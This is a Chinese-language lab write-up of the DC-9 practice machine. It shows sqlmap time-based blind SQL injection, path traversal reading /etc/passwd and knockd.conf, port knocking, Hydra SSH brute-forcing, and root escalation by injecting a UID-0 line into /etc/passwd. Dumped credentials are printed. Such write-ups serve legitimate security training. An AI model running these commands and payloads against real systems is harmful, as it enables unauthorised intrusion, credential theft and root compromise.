# DC-9 靶机实战

## 一、靶机信息

| 项目       | 信息                   |
| ---------- | ---------------------- |
| 靶机名称   | DC-9                   |
| 靶机 IP    | `172.20.10.6`          |
| 操作系统   | Debian                 |
| Web 服务   | Apache 2.4.38          |
| Web 入口   | `search.php`           |
| 初始漏洞   | SQL 时间盲注           |
| 后续漏洞   | 任意文件读取、端口敲门 |
| 初始 Shell | fredf                  |
| 最终权限   | root                   |

## 二、信息收集

### 1. Nmap 端口扫描

```
nmap -sV -sC 172.20.10.6
```

初始扫描结果：

```
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.38 ((Debian))
```

发现：

- 22：SSH 端口处于 filtered 状态，暂时无法直接连接。
- 80：Apache Web 服务开放，可以进一步进行 Web 信息收集。

<img src=".\images\01.png" alt="01" style="zoom:33%;" />

<img src=".\images\02.png" alt="01" style="zoom:33%;" />

## 三、Web 信息收集与漏洞利用

### 1. SQL 注入漏洞发现

访问：

```
http://172.20.10.6/search.php
```

发现搜索功能可能存在 SQL 注入。

使用 Burp Suite 拦截请求，发现实际提交数据的接口为：

```
POST /results.php HTTP/1.1
Host: 172.20.10.6
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=67phk1rlhlpkjjio57hc43d67e

search=
```

将请求保存为：

```
desktop/1.txt
```

### 2. SQL 注入类型判断

通过 sqlmap 检测，发现：

```
Type: time-based blind
```

漏洞类型：

- 时间盲注（Time-based Blind SQL Injection）
- 注入参数：`search`
- 注入位置：POST 请求参数

<img src=".\images\03.png" alt="01" style="zoom:33%;" />

### 3. 枚举数据库

```
sqlmap -r desktop/1.txt --batch --dbs
```

发现三个数据库：

```
available databases [3]:

information_schema
Staff
users
```

<img src=".\images\04.png" alt="01" style="zoom:33%;" />

### 4. 枚举数据表

枚举 Staff 数据库：

```
sqlmap -r desktop/1.txt --batch -D Staff --tables
```

结果：

```
Database: Staff

+--------------+
| StaffDetails |
| Users        |
+--------------+
```

枚举 users 数据库：

```
sqlmap -r desktop/1.txt --batch -D users --tables
```

结果：

```
Database: users

+-------------+
| UserDetails |
+-------------+
```

<img src=".\images\05.png" alt="01" style="zoom:33%;" />

<img src=".\images\06.png" alt="01" style="zoom:33%;" />

### 5. 枚举字段

分别查看三个数据表的字段：

```
sqlmap -r desktop/1.txt --batch -D Staff -T StaffDetails --columns

sqlmap -r desktop/1.txt --batch -D Staff -T Users --columns

sqlmap -r desktop/1.txt --batch -D users -T UserDetails --columns
```

### 6. 提取数据库内容

在数据库中发现管理员密码哈希：

```
admin : 856f5de590ef37314e7c3bdf6f8a66dc
```

<img src=".\images\07.png" alt="01" style="zoom:33%;" />

另外获取到一批用户账号密码：

| 用户名    | 密码          |
| --------- | ------------- |
| marym     | 3kfs86sfd     |
| julied    | 468sfdfsd2    |
| fredf     | 4sfd87sfd1    |
| barneyr   | RocksOff      |
| tomc      | TC&TheBoyz    |
| jerrym    | B8m#48sd      |
| wilmaf    | Pebbles       |
| bettyr    | BamBam01      |
| chandlerb | UrAG0D!       |
| joeyt     | Passw0rd      |
| rachelg   | yN72#dsd      |
| rossg     | ILoveRachel   |
| monicag   | 3248dsds7s    |
| phoebeb   | smellycats    |
| scoots    | YR3BVxxxw87   |
| janitor   | Ilovepeepee   |
| janitor2  | Hawaii-Five-0 |

### 7. 密码哈希破解

将管理员哈希保存为 `1.hash`：

```
856f5de590ef37314e7c3bdf6f8a66dc
```

使用 sqlmap 内置字典破解：

```
sqlmap --crack=1.hash
```

得到明文密码：

```
transorbital1
```

<img src=".\images\08.png" alt="01" style="zoom:33%;" />

## 四、任意文件读取

### 1. 发现文件读取漏洞

访问：

```
http://172.20.10.6/manage.php?file=../../../../../../etc/passwd
```

成功读取系统文件：

```
/etc/passwd
```

说明 `manage.php` 存在任意文件读取漏洞，可能涉及目录遍历（Path Traversal）。

<img src=".\images\09.png" alt="01" style="zoom:33%;" />

### 2. 读取 Knockd 配置文件

进一步读取：

```
http://172.20.10.6/manage.php?file=../../../../../../etc/knockd.conf
```

发现端口敲门配置：

```
sequence = 7469,8475,9842
```

这里涉及 Linux 的端口敲门机制（Port Knocking）。

**原理：**

目标 SSH 端口默认处于 filtered 状态，需要按照指定顺序访问特定端口，触发防火墙规则，之后 SSH 才会开放。

<img src=".\images\10.png" alt="01" style="zoom:33%;" />

## 五、Port Knocking 端口敲门

### 1. 按顺序敲门

依次执行：

```
nmap -p 7469 172.20.10.6

nmap -p 8475 172.20.10.6

nmap -p 9842 172.20.10.6
```

注意：三个端口必须按照配置文件中的顺序访问。

### 2. 重新扫描端口

```
nmap -sV -sC 172.20.10.6
```

发现 SSH 端口已经开放：

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

至此，成功通过端口敲门开放 SSH 服务。

<img src=".\images\11.png" alt="01" style="zoom:33%;" />

## 六、SSH 用户密码爆破

### 1. Hydra 爆破

将数据库提取的用户名和密码分别整理到：

```
username.txt
password.txt
```

使用 Hydra 进行 SSH 登录测试：

```
hydra -L username.txt -P password.txt ssh://172.20.10.6 -t 5
```

发现有效账号：

```
[22][ssh] host: 172.20.10.6
login: chandlerb
password: UrAG0D!

[22][ssh] host: 172.20.10.6
login: joeyt
password: Passw0rd

[22][ssh] host: 172.20.10.6
login: janitor
password: Ilovepeepee
```

### 2. 获取更多密码

后续发现一批密码：

```
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
```

### 3. 成功获取 SSH 登录凭据

发现有效账号：

```
username: fredf
password: B4-Tru3-001
```

使用 SSH 登录：

```
ssh fredf@172.20.10.6
```

至此，获得普通用户 Shell。

## 七、Linux 本地提权

### 1. 查看 sudo 权限

登录 fredf 后执行：

```
sudo -l
```

发现可以执行：

```
/opt/devstuff/dist/test/test
```

该程序具有特殊的 sudo 执行权限，可以进一步分析其功能。

### 2. 分析提权程序

`test` 程序涉及文件内容写入功能，可以利用其写入系统用户管理文件 `/etc/passwd`。

Linux 的 `/etc/passwd` 文件保存用户基本信息，包括：

```
用户名:密码字段:UID:GID:用户描述:家目录:登录Shell
```

其中 UID 为 `0` 的用户具有 root 权限。

### 3. 构造 root 用户记录

构造用户记录：

```
test:adrla7IBSfTZQ:0:0:root:/root:/bin/bash
```

字段说明：

| 字段     | 内容          | 作用       |
| -------- | ------------- | ---------- |
| 用户名   | test          | 新用户名称 |
| 密码字段 | adrla7IBSfTZQ | 密码哈希   |
| UID      | 0             | root 权限  |
| GID      | 0             | root 组    |
| 描述     | root          | 用户描述   |
| 家目录   | /root         | 用户家目录 |
| Shell    | /bin/bash     | 登录 Shell |

### 4. 利用程序写入 passwd

通过具有 sudo 权限的程序，将构造好的用户记录写入 `/etc/passwd`。

成功后切换用户：

```
su test
```

输入对应密码，成功切换到 UID 为 0 的账户。

### 5. 验证提权结果

```
id
```

最终获得 root 权限，提权成功。

<img src=".\images\12.png" alt="01" style="zoom:33%;" />

## 八、最终攻击链

```
Nmap 端口扫描
      |
      v
发现 80 端口开放
      |
      v
search.php SQL 时间盲注
      |
      v
sqlmap 枚举数据库
      |
      v
提取用户账号密码
      |
      v
manage.php 任意文件读取
      |
      v
读取 /etc/knockd.conf
      |
      v
Port Knocking 端口敲门
      |
      v
开放 SSH 22 端口
      |
      v
Hydra SSH 密码爆破
      |
      v
获得 fredf 普通用户 Shell
      |
      v
sudo -l 发现特殊程序
      |
      v
利用程序写入 /etc/passwd
      |
      v
切换 UID=0 用户
      |
      v
获得 root 权限
```

## 九、实战总结

### 1. 本次涉及的知识点

- Nmap 端口扫描
- Burp Suite 请求抓包与保存
- SQL 时间盲注
- sqlmap 数据库枚举与数据导出
- MD5 密码哈希破解
- 任意文件读取
- Path Traversal 目录遍历
- Knockd 端口敲门
- Hydra SSH 爆破
- Linux sudo 权限分析
- `/etc/passwd` 用户管理文件
- Linux 本地权限提升

### 2. 个人复盘

本次靶机比较重要的是攻击链之间的关联。

**第一阶段：SQL 注入获取凭据**

通过搜索功能发现时间盲注，利用 sqlmap 提取数据库中的用户信息，为后续 SSH 登录提供用户名和密码字典。

**第二阶段：任意文件读取与端口敲门**

通过 `manage.php` 读取 `/etc/knockd.conf`，发现目标使用 Knockd 进行 SSH 端口访问控制。按照指定顺序敲门后，SSH 端口开放。

**第三阶段：SSH 登录与权限提升**

利用 Hydra 对获取的账号密码进行组合测试，成功获得 fredf 的 SSH 权限。随后通过 `sudo -l` 发现特殊程序，利用其文件写入能力修改 `/etc/passwd`，创建 UID 为 0 的用户，最终获得 root 权限。

### 3. 本次重点掌握

| 技术          | 需要掌握的重点                  |
| ------------- | ------------------------------- |
| SQL 时间盲注  | POST 请求分析、数据库枚举       |
| 文件读取      | 目录遍历、敏感文件读取          |
| Port Knocking | 端口敲门原理、Knockd 配置       |
| Hydra         | SSH 用户名密码组合测试          |
| sudo 提权     | 分析特殊权限程序                |
| passwd 提权   | UID/GID、密码字段、用户管理文件 |